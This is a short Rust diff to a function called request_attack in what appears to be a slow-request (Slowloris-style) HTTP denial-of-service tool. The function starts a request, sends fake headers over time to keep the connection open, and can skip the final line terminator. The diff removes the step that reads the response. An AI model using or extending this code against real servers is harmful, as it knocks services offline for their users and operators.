@@ -77,7 +77,7 @@ impl Target {
 /// `cycles` is the number of times a new fake header should be written, or 0 for no additional headers.
 /// `finalize` sets whether or not to send the terminating `\r\n`, and `post` changes the verb from GET to POST.
 /// `threadn` is the thread number of this thread.
-fn request_attack<T: Sized + Read + Write>(connection: &mut T, timeout: u32, cycles: u32, finalize: bool, post: bool, threadn: usize) {
+fn request_attack<T: Sized + Write>(connection: &mut T, timeout: u32, cycles: u32, finalize: bool, post: bool, threadn: usize) {
     // Start a valid HTTP request
     let initial_request = if post {b"POST / HTTP/1.0\r\n"} else {b"GET  / HTTP/1.0\r\n"};
     connection.write_all(initial_request)
@@ -100,9 +100,6 @@ fn request_attack<T: Sized + Read + Write>(connection: &mut T, timeout: u32, cyc
         connection.write_all(b"\r\n")
             .unwrap_or_else(|e| {error!("[REQUEST:{}] !!! Couldn't write finalizer. {}", threadn, e); panic!();});
         info!("[REQUEST:{}] Wrote finalizer.", threadn);
-        let mut res = vec![];
-        connection.read_to_end(&mut res).unwrap_or_else(|e| {error!("[REQUEST:{}] Failed to read response. {}", threadn, e); panic!();});
-        debug!("[REQUEST:{}] Response length: {}", threadn, res.len());
     } else {
         info!("[REQUEST:{}] Terminating without finalizer.", threadn);
     }
